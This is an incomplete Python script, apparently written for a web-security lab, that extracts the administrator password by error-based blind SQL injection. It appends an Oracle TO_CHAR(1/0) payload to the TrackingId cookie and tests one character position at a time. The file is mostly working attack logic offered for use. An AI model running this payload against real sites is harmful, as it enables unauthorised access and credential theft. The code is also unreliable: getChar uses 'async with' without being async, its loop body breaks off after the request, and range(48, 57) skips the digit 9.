import sys
import requests
import urllib3
import urllib
import asyncio
import aiohttp
import json
import copy

def getChar(position, url, session, cookies_in):
    # Crack characters 0-9
    for j in range(48, 57):
        cookies = copy.deepcopy(cookies_in)
        sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload
        async with session.get(url, cookies=cookies, ssl=False) as r:
            

def main():
    with open("config.json") as f:
        config = json.load(f)
        print(config)

    if(not("url" in config) or not("TrackingId" in config) or not("session" in config) or not("http_proxy" in config) or not("https_proxy" in config)):
        sys.stdout.write("(+) Use the config.json file to configure the script.\n")
        sys.stdout.write("(+) For syntax, see the github repo.\n")
        sys.stdout.flush()
        return

    url = config["url"]
    cookies = {
        "TrackingId": config["TrackingId"],
        "session": config["session"],
    }
    proxies = {
        "http": config["http_proxy"],
        "https": config["https_proxy"]
    }
    print("(+) Settings: \nURL: %s\nCookies: %s\nProxies: %s\n" % (url, cookies, proxies))
    print("(+) Retrieving administrator password...\n")